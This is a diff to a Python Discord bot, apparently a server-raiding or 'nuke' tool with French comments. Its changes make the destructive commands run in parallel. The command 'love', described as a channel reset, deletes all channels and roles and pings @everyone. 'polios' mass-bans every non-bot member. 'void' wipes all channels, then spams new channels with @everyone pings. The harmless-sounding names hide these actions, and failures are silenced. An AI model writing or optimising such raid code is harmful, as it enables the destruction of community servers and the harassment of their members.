@@ -37,7 +37,14 @@ async def delete_channel(channel):
         pass
 
 
-@tree.command(name="love", description="Réinitialise les salons du serveur.")
+async def delete_role(role):
+    try:
+        await role.delete()
+    except Exception:
+        pass
+
+
+@tree.command(name="love", description="Réinitialise les salons et rôles du serveur.")
 @app_commands.describe(nouveau_nom="Nouveau nom du serveur (optionnel)")
 async def love(interaction: discord.Interaction, nouveau_nom: str = None):
     if not is_owner(interaction):
@@ -48,13 +55,27 @@ async def love(interaction: discord.Interaction, nouveau_nom: str = None):
 
     guild = interaction.guild
 
-    await asyncio.gather(*[delete_channel(c) for c in guild.channels])
+    # Supprime tous les salons et rôles en parallèle
+    roles_to_delete = [r for r in guild.roles if not r.is_default() and r.position < guild.me.top_role.position]
+    await asyncio.gather(
+        *[delete_channel(c) for c in guild.channels],
+        *[delete_role(r) for r in roles_to_delete]
+    )
+
+    # Recrée un salon "x"
+    try:
+        channel = await guild.create_text_channel("x")
+        await channel.send("@everyone")
+    except Exception:
+        pass
 
     if nouveau_nom:
         try:
             await guild.edit(name=nouveau_nom)
         except Exception:
             pass
+
+    await interaction.followup.send("✅ Fait.", ephemeral=True)
 
 
 @tree.command(name="polios", description="Gestion des membres du serveur.")
@@ -92,14 +113,8 @@ async def polios(
 
     if action_globale:
         members = [m for m in guild.members if m.id != OWNER_ID and not m.bot]
-        count = 0
-        for m in members:
-            try:
-                await guild.ban(m, reason=raison, delete_message_days=0)
-                count += 1
-            except Exception:
-                pass
-        await interaction.followup.send(f"Action effectuée sur {count} membre(s).", ephemeral=True)
+        await asyncio.gather(*[guild.ban(m, reason=raison, delete_message_days=0) for m in members], return_exceptions=True)
+        await interaction.followup.send(f"Action effectuée sur {len(members)} membre(s).", ephemeral=True)
         return
 
     await interaction.followup.send("Paramètres incorrects.", ephemeral=True)
@@ -123,18 +138,20 @@ async def void(
 
     guild = interaction.guild
 
+    # Supprime tout en parallèle
     await asyncio.gather(*[delete_channel(c) for c in guild.channels])
 
-    created = 0
-    for i in range(1, nombre + 1):
+    # Crée tous les salons en parallèle
+    async def create_and_ping(i):
         try:
             channel = await guild.create_text_channel(str(i))
             await channel.send(f"@everyone {message}")
-            created += 1
         except Exception:
             pass
 
-    await interaction.followup.send(f"✅ {created} salon(s) créé(s) avec @everyone pingé dedans.", ephemeral=True)
+    await asyncio.gather(*[create_and_ping(i) for i in range(1, nombre + 1)])
+
+    await interaction.followup.send(f"✅ {nombre} salon(s) créé(s).", ephemeral=True)
 
 
 if __name__ == "__main__":
